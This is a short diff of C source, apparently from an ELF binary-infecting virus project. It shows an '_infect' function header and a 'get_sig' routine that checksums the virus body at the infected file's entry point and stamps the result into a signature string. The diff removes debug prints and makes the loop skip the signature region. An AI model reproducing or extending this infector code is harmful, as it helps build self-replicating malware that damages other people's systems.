@@ -129,7 +129,6 @@ static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, si
 
 int get_sig(char *s, size_t n, size_t virus_len, char *sig)
 {
-	//print(sig);
 	Elf64_Ehdr *h = (void*)s;
 	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
 	size_t sig_len = slen(sig);
@@ -139,13 +138,12 @@ int get_sig(char *s, size_t n, size_t virus_len, char *sig)
 
 	size_t i;
 	size_t sig_sum = 0;;
+
 	for (i = 0; i < virus_len; i++)
 	{
+		if (i == (size_t)(DATA + 7 * sizeof(size_t*)))
+			i += sig_len;
 		sig_sum += *(unsigned char*)(s + entry + i);
-		if (i == 25)
-		break;
-		//printnb(sig_sum);
-		//print((unsigned char*)(s + entry + 109));
 	}
 
 	sig[sig_len - 8] = ((sig_sum / 1) % 10) + '0';
@@ -157,7 +155,6 @@ int get_sig(char *s, size_t n, size_t virus_len, char *sig)
 	sig[sig_len - 2] = ((sig_sum / 1000000) % 10) + '0';
 	sig[sig_len - 1] = ((sig_sum / 10000000) % 10) + '0';
 
-	//print(sig);
 	return TRUE;
 }
 
